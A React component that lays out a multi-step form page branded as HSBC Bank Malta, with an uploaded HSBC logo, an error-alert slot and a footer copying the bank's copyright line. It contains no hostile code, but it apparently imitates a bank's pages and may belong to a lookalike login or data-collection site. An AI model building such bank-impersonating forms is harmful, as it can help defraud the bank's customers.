import { ReactNode } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import ErrorAlert from './ErrorAlert';

interface FormLayoutProps {
  children: ReactNode;
  title: string;
  description?: string;
  currentStep?: number;
  totalSteps?: number;
}

const FormLayout = ({ children, title, description, currentStep, totalSteps }: FormLayoutProps) => {
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header with HSBC Logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <img 
            src="/uploaded/2cb7125c-8178-444d-9da1-b5b7641913ec.png" 
            alt="HSBC"
            className="h-8 w-auto"
          />
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-3 sm:p-4">
        <Card className="w-full max-w-xs sm:max-w-sm md:max-w-md shadow-lg mx-2">
          <CardHeader className="text-center space-y-3 p-3 sm:p-4 md:p-6">
            <div className="space-y-2">
              <CardTitle className="text-lg sm:text-xl md:text-2xl text-gray-800 leading-tight">
                {title}
              </CardTitle>
              {description && (
                <p className="text-xs sm:text-sm text-gray-600 leading-relaxed px-1 sm:px-2">{description}</p>
              )}
            </div>
          </CardHeader>
          <CardContent className="space-y-3 sm:space-y-4 md:space-y-6 p-3 sm:p-4 md:p-6 pt-0">
            <ErrorAlert />
            {children}
          </CardContent>
        </Card>
      </div>

      {/* Footer */}
      <footer className="bg-black text-white py-6">
        <div className="max-w-7xl mx-auto px-6 text-center">
          <div className="text-sm space-y-2">
            <div className="flex items-center justify-center space-x-4">
              <span>Investor relations</span>
              <span>|</span>
              <span>HSBC Group</span>
              <span>|</span>
              <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
            </div>
            <div>
              <span>This website is designed for use in Malta. Cross-border banking</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default FormLayout;